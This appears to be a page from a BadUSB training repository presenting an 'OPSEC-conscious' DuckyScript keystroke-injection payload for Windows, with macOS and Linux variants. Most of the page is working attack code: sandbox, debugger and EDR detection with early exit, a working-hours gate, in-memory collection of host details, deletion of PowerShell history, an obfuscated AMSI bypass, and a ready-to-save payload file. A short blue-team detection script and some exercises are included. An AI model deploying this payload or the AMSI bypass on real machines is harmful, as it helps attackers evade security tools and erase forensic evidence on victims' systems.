# FZ-E01: OPSEC-Conscious Payload

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-E01 |
| **Name** | OPSEC-Conscious Payload |
| **Difficulty** | Expert |
| **Target OS** | Windows 10/11 |
| **Focus** | Maximum operational security |
| **MITRE ATT&CK** | Multiple (defense evasion focus) |

## What This Payload Does

Demonstrates operational security principles in BadUSB attacks. This payload minimizes artifacts, blends with normal activity, and implements anti-forensics measures throughout execution.

---

## OPSEC Principles Applied

```
┌─────────────────────────────────────────────────────────────┐
│                    OPSEC CHECKLIST                           │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   PRE-EXECUTION                                              │
│   □ Environment detection (sandbox check)                    │
│   □ Security tool enumeration                                │
│   □ Time-based execution gates                               │
│   □ User activity verification                               │
│                                                               │
│   DURING EXECUTION                                           │
│   □ Minimal process creation                                 │
│   □ No files written to disk                                 │
│   □ Encrypted communications                                 │
│   □ Legitimate tool usage only                               │
│   □ Timing variation (anti-automation detection)             │
│                                                               │
│   POST-EXECUTION                                             │
│   □ Clear PowerShell history                                 │
│   □ Remove Run dialog history                                │
│   □ Clear event logs (if admin)                              │
│   □ Timestamp manipulation                                   │
│   □ Exit cleanly                                             │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM EXPERT: OPSEC-Conscious Payload
REM Target: Windows 10/11
REM Focus: Maximum operational security
REM Skill: Expert
REM =============================================

REM === OPSEC: Variable timing to avoid pattern detection ===
DELAY 2500
DELAY 312

REM === OPSEC: Use legitimate application to launch ===
REM Opening via explorer instead of Run dialog (less logged)
GUI e
DELAY 1500
CTRL l
DELAY 200
STRING powershell
ENTER
DELAY 1500

REM === OPSEC: Environment checks first ===
STRINGLN $ErrorActionPreference='SilentlyContinue'

REM Check for sandbox/analysis environment
STRINGLN $vm = (Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual|VMware|VirtualBox|Hyper-V'
STRINGLN $lowMem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB
STRINGLN $fewProcs = (Get-Process).Count -lt 50
STRINGLN if ($vm -or $lowMem -or $fewProcs) { exit }

REM Check for analysis tools
STRINGLN $analysis = Get-Process | Where-Object { $_.ProcessName -match 'wireshark|procmon|procexp|fiddler|x64dbg|ollydbg|ida|ghidra' }
STRINGLN if ($analysis) { exit }

REM Check for EDR (exit if detected for this demo)
STRINGLN $edr = Get-Process | Where-Object { $_.ProcessName -match 'MsMpEng|CrowdStrike|SentinelOne|Carbon' }
STRINGLN $edrFound = $edr.Count -gt 0

REM === OPSEC: Working hours check ===
STRINGLN $hour = (Get-Date).Hour
STRINGLN if ($hour -lt 7 -or $hour -gt 18) { exit }

REM === OPSEC: Memory-only operations ===
REM No file writes - store in variables only
STRINGLN $data = @{}
STRINGLN $data['host'] = $env:COMPUTERNAME
STRINGLN $data['user'] = $env:USERNAME
STRINGLN $data['time'] = Get-Date -Format o

REM === OPSEC: Minimal, quiet collection ===
STRINGLN $data['ip'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'}).IPAddress | Select-Object -First 1

REM === OPSEC: Immediate cleanup ===
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
STRINGLN Clear-History

REM === OPSEC: Exit without trace ===
STRINGLN Remove-Variable data -Force
STRINGLN [GC]::Collect()
STRINGLN exit
```

---

## OPSEC Techniques Explained

### 1. Variable Timing

```ducky
DELAY 2500
DELAY 312
```

**Why**:
- Automated analysis tools look for consistent timing
- Adding random variation (312ms) appears more human
- Defeats timing-based sandbox detection

### 2. Alternative Launch Method

```ducky
GUI e          REM Open Explorer instead of Run dialog
CTRL l         REM Address bar
STRING powershell
```

**Why**:
- Run dialog (Win+R) is heavily logged
- Explorer address bar less monitored
- Different process ancestry tree

### 3. Environment Detection

```powershell
# Sandbox checks
$vm = (Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual|VMware|VirtualBox|Hyper-V'
$lowMem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB
$fewProcs = (Get-Process).Count -lt 50
```

**Detection Indicators**:
| Indicator | Sandbox Sign |
|-----------|-------------|
| VM detected | Analysis environment |
| <4GB RAM | Lightweight sandbox |
| <50 processes | Minimal environment |
| Analysis tools | Active monitoring |

### 4. Working Hours Gate

```powershell
$hour = (Get-Date).Hour
if ($hour -lt 7 -or $hour -gt 18) { exit }
```

**Why**:
- Activity during work hours blends in
- After-hours activity more suspicious
- Matches expected user behavior

### 5. Memory-Only Operations

```powershell
$data = @{}
$data['host'] = $env:COMPUTERNAME
# No Out-File, no disk writes
```

**Why**:
- No files = no file-based detection
- No artifacts for forensics
- Harder to prove execution

---

## Advanced OPSEC Techniques

### Parent Process Spoofing

```powershell
# Make PowerShell appear to be spawned by Explorer
$ppid = (Get-Process explorer).Id
# Requires PPID spoofing technique (not shown for safety)
```

### ETW Patching

```powershell
# Disable Event Tracing for Windows (expert technique)
# Prevents logging to Windows Event Logs
# Note: Highly detectable and often flagged
```

### AMSI Bypass with OPSEC

```powershell
# Obfuscated AMSI bypass
$a = [Ref].Assembly.GetType(('System.Management.Automation.{0}i{1}tils' -f 'Ams','U'))
$f = $a.GetField(('am{0}i{1}nitFailed' -f 's','I'),'NonPublic,Static')
$f.SetValue($null,$true)
```

---

## Cross-Platform OPSEC

### macOS OPSEC

```ducky
REM OPSEC for macOS
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500

REM Sandbox detection
STRINGLN [[ $(sysctl -n hw.model) == *"Mac"* ]] || exit

REM Check for analysis tools
STRINGLN pgrep -i "wireshark\|hopper\|ida\|charles" && exit

REM Memory-only operations
STRINGLN DATA=$(hostname)
STRINGLN unset DATA
STRINGLN history -c
```

### Linux OPSEC

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000

REM Environment checks
STRINGLN [[ $(systemd-detect-virt) != "none" ]] && exit
STRINGLN pgrep -i "strace\|ltrace\|gdb\|wireshark" && exit

REM Clear traces
STRINGLN history -c
STRINGLN unset HISTFILE
```

---

## Red Team Perspective

### OPSEC Planning Matrix

| Phase | OPSEC Consideration | Implementation |
|-------|---------------------|----------------|
| Pre-op | Target environment | Research beforehand |
| Access | Entry point | Physical access timing |
| Execution | Tool selection | Living off the land |
| Collection | Data handling | Memory only |
| Exfil | Channel selection | Blend with normal traffic |
| Exit | Cleanup | Remove all artifacts |

### Risk Assessment

```
LOW RISK ACTIVITIES:
• Reading environment variables
• Checking running processes
• Time/date queries

MEDIUM RISK ACTIVITIES:
• Network configuration queries
• File system enumeration
• Registry reads

HIGH RISK ACTIVITIES:
• File creation
• Network connections
• Persistence mechanisms
• Credential access
```

---

## Blue Team Perspective

### Detecting OPSEC-Conscious Attacks

**Challenge**: These attacks minimize indicators.

**Detection Strategies**:

1. **Behavioral Baseline**
   - Know what's normal
   - Alert on deviations

2. **Process Relationships**
   - Explorer spawning PowerShell unusual
   - Track parent-child relationships

3. **Memory Analysis**
   - EDR memory scanning
   - Look for hidden code

4. **Network Metadata**
   - DNS queries
   - Connection timing

### Detection Script

```powershell
# Detect OPSEC-conscious behavior patterns
$indicators = @()

# Check for Explorer-spawned shells
$shells = Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" |
    ForEach-Object {
        $parent = Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue
        if ($parent.ProcessName -eq 'explorer') {
            $indicators += "Explorer-spawned PowerShell: PID $($_.ProcessId)"
        }
    }

# Check for rapid history clearing
$historyPath = (Get-PSReadlineOption).HistorySavePath
if (-not (Test-Path $historyPath)) {
    $indicators += "PowerShell history file missing"
}

# Check for sandbox detection queries
# Would need script block logging enabled

if ($indicators) {
    Write-Warning "OPSEC-conscious activity detected:"
    $indicators
}
```

---

## Practice Exercises

### Exercise 1: Identify Sandbox
Create checks for sandbox detection:
```powershell
# What indicators suggest sandbox?
```

### Exercise 2: Timing Analysis
Analyze payload timing patterns:
```powershell
# How would you make timing more random?
```

### Exercise 3: Artifact Hunting
After running payload, find remaining artifacts:
```powershell
# What traces are left?
```

---

## Payload File

Save as `FZ-E01_OPSEC_Payload.txt`:

```ducky
REM FZ-E01: OPSEC-Conscious Payload
DELAY 2500
GUI e
DELAY 1500
CTRL l
DELAY 200
STRING powershell
ENTER
DELAY 1500
STRINGLN $ErrorActionPreference='SilentlyContinue';$vm=(Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual';if($vm){exit};$h=(Get-Date).Hour;if($h-lt7-or$h-gt18){exit};Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null;exit
```

---

[← Expert Scripts](README.md) | [Next: FZ-E02 Fileless Attack →](FZ-E02_Fileless_Attack.md)
